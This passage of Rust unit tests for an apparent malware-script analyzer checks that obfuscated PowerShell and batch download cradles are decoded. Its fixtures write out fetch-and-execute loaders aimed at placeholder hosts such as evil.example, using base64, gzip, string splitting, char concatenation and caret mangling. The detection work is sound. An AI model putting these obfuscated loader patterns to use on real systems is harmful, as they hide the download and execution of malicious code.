        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script = format!(r#"powershell -EncodedCommand {b64}""#);
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == "https://generic.example/example.mp4")
            }),
            "constructed iwr URL missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn downloadstring_url_extracted() {
        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadString('https://evil.example/payload.ps1')"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/payload.ps1")
            )
        });
        assert!(has, "no Download from DownloadString: {:?}", report.traits);
    }

    #[test]
    fn split_downloadstring_fragment_url_extracted() {
        let ps = r#"$a='ent).Down';$b='loadString(''http://frag.example/a.mp4'')';$c=IEX ($a,$b -Join '')|IEX"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://frag.example/a.mp4"
            )
        });
        assert!(
            has,
            "no Download from split DownloadString fragment: {:?}",
            report.traits
        );
    }

    #[test]
    fn bare_downloadstring_fragment_url_extracted() {
        let ps = r#"$x='ADSTRING(''https://bare.example/p.png'')'.Replace('AD','Download');iex $x"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://bare.example/p.png"
            )
        });
        assert!(
            has,
            "no Download from bare DownloadString fragment: {:?}",
            report.traits
        );
    }

    #[test]
    fn adstring_downloadstring_suffix_fragment_url_extracted() {
        let ps = r#"$x='ADSTRING(''https://suffix.example/p.png'')';iex $x"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://suffix.example/p.png"
            )
        });
        assert!(
            has,
            "no Download from ADSTRING suffix fragment: {:?}",
            report.traits
        );
    }

    #[test]
    fn dynamic_downloadstring_invoke_foreach_urls_extracted() {
        let ps = r#"$b=New-Object Net.WebClient;foreach($u in @('http://dyn.example/a.ps1','https://dyn.example/b.ps1')){$b.('DownloadString').Invoke($u)}"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        for expected in ["http://dyn.example/a.ps1", "https://dyn.example/b.ps1"] {
            let has = report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == expected
                )
            });
            assert!(
                has,
                "no Download from dynamic DownloadString Invoke for {expected}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn dynamic_downloadstring_invoke_foreach_ftp_url_extracted() {
        let ps = r#"$b=New-Object Net.WebClient;foreach($u in @('ftp://dyn.example/a.dat')){$b.('DownloadString').Invoke($u)}"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "ftp://dyn.example/a.dat"
            )
        });
        assert!(
            has,
            "no Download from dynamic DownloadString Invoke ftp URL: {:?}",
            report.traits
        );
    }

    #[test]
    fn dynamic_downloadstring_invoke_foreach_array_variable_urls_extracted() {
        let ps = r#"$urls=@('http://dyn-array.example/a.ps1','hTtPs:\\dyn-array.example\b.ps1');$b=New-Object Net.WebClient;foreach($u in $urls){$b.('DownloadString').Invoke($u)}"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        for expected in [
            "http://dyn-array.example/a.ps1",
            "https://dyn-array.example/b.ps1",
        ] {
            let has = report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == expected
                )
            });
            assert!(
                has,
                "no Download from dynamic DownloadString array variable for {expected}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn dynamic_downloadfile_partial_method_literal_url_extracted() {
        let ps = r#"$opsam=New-Object System.Net.WebClient;$opsam.'DOwn'.Invoke('https://dyn.example/drop.cur',$env:TEMP+'\drop.cur')"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://dyn.example/drop.cur"
            )
        });
        assert!(
            has,
            "no Download from partial dynamic DownloadFile Invoke: {:?}",
            report.traits
        );
    }

    #[test]
    fn start_bitstransfer_destination_extracted() {
        let ps = r#"Start-BitsTransfer -Source "https://bitsps.example/drop.exe" -Destination "C:\ProgramData\drop.exe""#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://bitsps.example/drop.exe"
                        && dst.as_deref() == Some("C:\\ProgramData\\drop.exe")
            )
        });
        assert!(
            has,
            "no BITS Download destination extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn raw_powershell_downloadfile_variable_url_extracted() {
        let script = r#"$clnt = New-Object System.Net.WebClient
$url = "http://download.example/tool.exe"
$file = "C:\ProgramData\tool.exe"
$clnt.DownloadFile($url,$file)
"#;
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://download.example/tool.exe"
                        && dst.as_deref() == Some("C:\\ProgramData\\tool.exe")
            )
        });
        assert!(
            has,
            "no Download from raw PowerShell DownloadFile variable URL/destination: {:?}",
            report.traits
        );
    }

    #[test]
    fn cmd_marker_mangled_powershell_downloadstring_url_extracted() {
        let script = r#"SET A=E
POW%!A%RSH%!A%LL.%!A%X%!A% -N^O^P -%!A%X%!A%C B^YPA^SS -NO^NI [BYT%!A%[]];$XCZM='I%!A%X(N%!A%W-OBJ%!A%CT N%!A%T.W';$SYWD='%!A%BCLI%!A%NT).DOWNLO';$VFDR='TUUL(''https://payload.example/a.png'')'.R%!A%PLAC%!A%('TUUL','ADSTRING');I%!A%X($XCZM+$SYWD+$VFDR)
"#;
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if src == "https://payload.example/a.png"
                        && line_hint == "raw-marker-powershell"
                )
            }),
            "raw marker PowerShell URL missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn start_bitstransfer_url_extracted() {
        let ps = r#"Start-BitsTransfer -Source "http://bits.example/x.exe" -Destination "C:\Temp\x.exe""#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("bits.example/x.exe")
            )
        });
        assert!(
            has,
            "no Download from Start-BitsTransfer: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod reg_query_synth_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn reg_query_emits_trait_returns_empty() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline(
            r"reg query HKLM\Software\Microsoft\Windows /v Version",
            &mut env,
        );
        assert!(lines.is_empty(), "expected empty, got {:?}", lines);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                crate::traits::Trait::RegQuery { key, .. } if key.contains("HKLM\\Software")
            )
        });
        assert!(has, "no RegQuery trait: {:?}", env.traits);
    }
}

#[cfg(test)]
mod dir_synth_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;
    use crate::traits::Trait;

    #[test]
    fn dir_emits_listing_trait() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline(r"dir /b /s C:\Windows\System32", &mut env);
        assert!(lines.is_empty());
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::DirListing { path, .. } if path.contains("System32")
            )
        });
        assert!(has, "no DirListing: {:?}", env.traits);
    }
}

#[cfg(test)]
mod findstr_regex_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn findstr_r_anchored_pattern() {
        // set | findstr /R ^mark should anchor to lines starting with mark
        // (env stores variable names lowercase, so output is mark_a=hello etc.)
        let mut env = Environment::new(&Config::default());
        env.set("MARK_A", "hello");
        env.set("MARK_B", "world");
        env.set("XMARK", "other");
        let lines = run_pipeline("set | findstr /R ^^mark", &mut env);
        // mark_a and mark_b start with mark; xmark does not start with mark
        assert!(
            lines.iter().all(|l| l.starts_with("mark")),
            "unexpected lines: {:?}",
            lines
        );
        assert_eq!(lines.len(), 2, "expected 2 mark lines, got {:?}", lines);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod synth_more_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn whoami_returns_synthetic_user() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline("whoami", &mut env);
        assert!(!lines.is_empty(), "whoami returned empty");
        assert!(
            lines[0].contains("puncher") || lines[0].contains('\\'),
            "whoami output: {:?}",
            lines
        );
    }

    #[test]
    fn chcp_returns_active_code_page() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline("chcp", &mut env);
        assert!(
            lines[0].to_ascii_lowercase().contains("code page"),
            "chcp output: {:?}",
            lines
        );
    }

    #[test]
    fn query_session_returns_synthetic() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline("query session", &mut env);
        assert!(!lines.is_empty(), "query session returned empty");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps1_obfuscation_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn ps1_char_concat_resolves_url() {
        // [char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]120 = "http://x"
        let inner = r#"$u=[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]120+[char]46+[char]99+[char]111+[char]109; Invoke-WebRequest -Uri $u"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        // Smoke test: just verify no panic. Variable indirection ($u) means the
        // URL may not resolve end-to-end via the existing IWR regex.
        let _ = report;
    }

    #[test]
    fn ps1_string_concat_resolves_url() {
        // Inject PS1 bytes directly via base64 encoding so no quoting issues.
        // 'http' + '://' + 'evil.example/x' + '/pay' → 'http://evil.example/x/pay'
        // DownloadString form so the URL doesn't need -Uri
        use base64::Engine;
        let inner = r#"(New-Object Net.WebClient).DownloadString('http' + '://' + 'evil.example' + '/x/pay')"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("evil.example")));
        assert!(
            has,
            "no Download trait from string-concat: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_char_plus_literal_concat_resolves_url() {
        use base64::Engine;
        let inner = r#"(New-Object Net.WebClient).DownloadString([char]104 + 'ttp://ps-char-literal.example/payload')"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://ps-char-literal.example/payload"
            )
        });
        assert!(
            has,
            "PowerShell [char] + literal URL concat missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_literal_char_literal_concat_resolves_url() {
        use base64::Engine;
        let inner = r#"(New-Object Net.WebClient).DownloadString('ht' + [char]116 + 'p://ps-lit-char.example/payload')"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://ps-lit-char.example/payload"
            )
        });
        assert!(
            has,
            "PowerShell literal + [char] + literal URL concat missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_format_double_quoted_resolves_url() {
        use base64::Engine;
        let inner =
            r#"Invoke-WebRequest -Uri ("{0}{1}{2}" -f "ht","tps://ps-format-dq.example","/stage")"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://ps-format-dq.example/stage"
            )
        });
        assert!(
            has,
            "double-quoted PS format URL was not deobfuscated: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_base64_string_decoded() {
        use base64::Engine;
        // After expanding [System.Convert]::FromBase64String('...') → 'http://b64.example/z'
        // the DownloadString pattern can pick up the literal URL directly.
        let url = "http://b64.example/z";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        // Inject via -EncodedCommand (UTF-16LE) so quoting is clean
        let inner = format!(
            "(New-Object Net.WebClient).DownloadString([System.Convert]::FromBase64String('{}'))",
            b64
        );
        let inner_b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", inner_b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("b64.example")));
        assert!(has, "no Download from base64-string: {:?}", report.traits);
    }

    #[test]
    fn ps1_normalization_decodes_getstring_base64_variable() {
        use base64::Engine;

        let filler: String = (0..2048).map(|n| format!("{n:04x}")).collect();
        let decoded =
            format!("Invoke-WebRequest -Uri https://b64-var.example/stage.ps1\r\n# {filler}");
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-var.example/stage.ps1"),
            "base64 variable script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String($blob)"),
            "base64 variable GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_trimmed_getstring_base64_variable() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-var-trim.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "$blob = ' {b64} '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.Trim())); iex $stage"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-var-trim.example/stage.ps1"),
            "trimmed base64 variable script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String($blob.Trim())"),
            "trimmed base64 variable GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_trimend_getstring_base64_variable() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-var-trimend.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "$blob = '{b64}   '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.TrimEnd())); iex $stage"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-var-trimend.example/stage.ps1"),
            "TrimEnd base64 variable script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String($blob.TrimEnd())"),
            "TrimEnd base64 variable GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_replace_cleaned_getstring_base64_variable() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-var-replace.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let midpoint = b64.len() / 2;
        let noisy = format!("{}XYZmarker{}", &b64[..midpoint], &b64[midpoint..]);
        let ps = format!(
            "$blob = '{noisy}'.Replace('XYZmarker',''); $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-var-replace.example/stage.ps1"),
            "Replace-cleaned base64 variable script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String($blob)"),
            "Replace-cleaned base64 variable GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_parenthesized_getstring_base64_variable() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-var-paren.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($blob))); iex $stage"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-var-paren.example/stage.ps1"),
            "parenthesized base64 variable script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String(($blob))"),
            "parenthesized base64 variable GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_trimmed_getstring_base64_literal() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-lit-trim.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' {b64} '.Trim())) | iex"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-lit-trim.example/stage.ps1"),
            "trimmed base64 literal script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String('"),
            "trimmed base64 literal GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_parenthesized_getstring_base64_literal() {
        use base64::Engine;

        let decoded = "Invoke-WebRequest -Uri https://b64-lit-paren.example/stage.ps1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(('{b64}'))) | iex"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://b64-lit-paren.example/stage.ps1"),
            "parenthesized base64 literal script was not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String(('"),
            "parenthesized base64 literal GetString call should be replaced:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_byte_array_getstring() {
        let bytes = "https://byte-array.example/stage.ps1"
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let ps = format!("[Text.Encoding]::ASCII.GetString([byte[]]({bytes})) | iex");

        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);

        assert!(
            normalized.contains("https://byte-array.example/stage.ps1"),
            "byte-array GetString call was not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_does_not_substitute_large_binary_base64_variable() {
        use base64::Engine;

        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
        binary.extend((0..=255).cycle().take(12_000));
        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
        let ps = format!("$blob = '{b64}'; $buf = [Convert]::FromBase64String($blob)");
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("FromBase64String($blob)"),
            "large binary base64 variable should not be substituted:\n{}",
            normalized
        );
        assert_eq!(
            normalized.matches(&b64).count(),
            1,
            "large base64 carrier should not be duplicated into call sites:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_convert_base64_unwraps_nested_script() {
        use base64::Engine;
        let decoded = r#"$url = "https://biteblob.example/Download/build.exe"; Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\file.exe""#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let inner = format!(
            "[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{b64}')) | Invoke-Expression"
        );
        let inner_b64 = base64::engine::general_purpose::STANDARD.encode(
            inner
                .encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", inner_b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t, Trait::Download { src, .. } if src.contains("biteblob.example/Download/build.exe"))
        });
        assert!(
            has,
            "no Download from nested [Convert] script: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_normalization_decodes_hex_split_char_loop() {
        let ps = r#"$h = '40 65 63 68 6f 20 6f 66 66 0d 0a 65 63 68 6f 20 68 69' -Split ' ' | foreach {[char]([convert]::toint16($_,16))}; $s = $h -join ''"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("@echo off") && normalized.contains("hi"),
            "hex split loop not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_strips_repeated_marker_noise() {
        fn interleave_markers(text: &str, markers: &[&str]) -> String {
            let mut out = String::new();
            for (idx, ch) in text.chars().enumerate() {
                out.push(ch);
                out.push_str(markers[idx % markers.len()]);
            }
            out
        }

        let ps = format!(
            "call powershell -c \"{}\"",
            interleave_markers(
                "Invoke-WebRequest -Uri 'http://x.example/a'",
                &["uLqiO", "RlbS"]
            )
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            !normalized.contains("uLqiO")
                && !normalized.contains("RlbS")
                && normalized.contains("Invoke-WebRequest -Uri 'http://x.example/a'"),
            "repeated marker noise not stripped:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_strips_marker_noise_next_to_base64_literal() {
        use base64::Engine;
        fn interleave_markers(text: &str, markers: &[&str]) -> String {
            let mut out = String::new();
            for (idx, ch) in text.chars().enumerate() {
                out.push(ch);
                out.push_str(markers[idx % markers.len()]);
            }
            out
        }

        let decoded = "Invoke-WebRequest -Uri https://readable.example/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let noisy_prefix =
            interleave_markers("[Text.Encoding]::UTF8.GetString", &["lymsW", "RlbS"]);
        let ps = format!("iex ({noisy_prefix}([Convert]::FromBase64String('{b64}')))");
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://readable.example/payload.exe")
                && !normalized.contains("lymsW"),
            "PS marker noise near base64 literal not handled:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_regex_replace_base64_variable() {
        use base64::Engine;
        let decoded = "Start-Sleep -Seconds 3\r\nInvoke-WebRequest https://readable.example/a";
        let utf16: Vec<u8> = decoded
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD
            .encode(&utf16)
            .replace('r', "f#");
        let ps = format!(
            "$ddsdgo = ''{b64}'';$x=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([regex]::Replace($ddsdgo, ''f#'', ''r'')));iex $x"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("Start-Sleep -Seconds 3")
                && normalized.contains("https://readable.example/a"),
            "regex-replaced b64 stage not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_literal_dot_replace() {
        let ps = r#"$x='Invoke-Expression(NEW-OBJECT NET.WEBCLIENT).DOWNLOXX(''https://replace.example/p.png'')'.REPLACE('XX','ADSTRING');iex $x"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("DOWNLOADSTRING('https://replace.example/p.png')")
                || normalized.contains("DownloadString('https://replace.example/p.png')"),
            "literal .Replace call not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_handles_non_ascii_after_dot_without_panic() {
        let ps = "'abc'.Repla\u{fffd}ce('a','b')";
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(normalized.contains("Repl"), "got:\n{}", normalized);
    }

    #[test]
    fn ps1_normalization_decodes_convertfrom_json_script_base64() {
        use base64::Engine;
        let decoded = "$DownloadURL = \"https://readable.example/file.zip\"\r\nInvoke-WebRequest -Uri $DownloadURL";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let ps = format!(
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(('{{\"Script\":\"{b64}\"}}' | ConvertFrom-Json).Script)) | iex"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("$DownloadURL = \"https://readable.example/file.zip\"")
                && normalized.contains("Invoke-WebRequest -Uri"),
            "ConvertFrom-Json Script payload not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_nested_gzip_format_base64() {
        use base64::Engine;
        use std::io::Write;

        let decoded = "Invoke-WebRequest -Uri https://gzip-format.example/stage.ps1";
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(decoded.as_bytes()).unwrap();
        let gz = encoder.finish().unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
        let needle = b64.chars().find(|c| c.is_ascii_digit()).expect("b64 digit");
        let template = b64.replacen(needle, "{0}", 1);
        let midpoint = template.len() / 2;
        let (left, right) = template.split_at(midpoint);
        let ps = format!(
            "$s.Arguments='-nop -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''{left}''+''{right}'')-f''{needle}'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://gzip-format.example/stage.ps1"),
            "nested gzip format payload not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.to_ascii_lowercase().contains("gzipstream"),
            "gzip wrapper should be replaced by the decoded script:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_variable_gzip_function_base64() {
        use base64::Engine;
        use std::io::Write;

        let filler: String = (0..1024).map(|n| format!("{n:04x}")).collect();
        let decoded =
            format!("Invoke-WebRequest -Uri https://gzip-func.example/stage.ps1\r\n# {filler}");
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(decoded.as_bytes()).unwrap();
        let gz = encoder.finish().unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
        let ps = format!(
            r#"
$blob = "{b64}"
function InflateBytes ([byte[]]$bytes) {{
    $inputStream = [IO.MemoryStream]::new($bytes)
    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
    $outputStream = [IO.MemoryStream]::new()
    $gzipStream.CopyTo($outputStream)
    $outputStream.ToArray()
}}
$stage = [Text.Encoding]::UTF8.GetString((InflateBytes([Convert]::FromBase64String($blob)))).TrimEnd("`0")
iex $stage
"#
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://gzip-func.example/stage.ps1"),
            "variable gzip function payload not decoded:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("FromBase64String($blob)"),
            "gzip function base64 call should be replaced by decoded script:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_escapes_binary_controls() {
        let normalized = crate::ps1_scan::normalize_ps1_text("Invoke-Expression 'A\0B\x01C'\r\n");
        assert!(
            normalized.contains("\\x00") && normalized.contains("\\x01"),
            "binary controls were not escaped:\n{}",
            normalized
        );
        assert!(
            !normalized.contains('\0') && !normalized.contains('\u{1}'),
            "normalized PowerShell should remain text-safe:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_for_substring_stride_function() {
        fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
                chars[start + idx * step] = c;
            }
            chars.into_iter().collect()
        }

        let decoded = "Invoke-WebRequest https://stride.example/a";
        let carrier = stride_carrier(decoded, 2, 3);
        let ps = format!(
            "Function Amphiptere($Baylor19){{For($Masselgem=2;$Masselgem -lt $Baylor19.Length;$Masselgem+=3){{$out+=$Baylor19.'su'.'Invoke'($Masselgem,1);}}$out}};$x=Amphiptere '{carrier}'"
        );
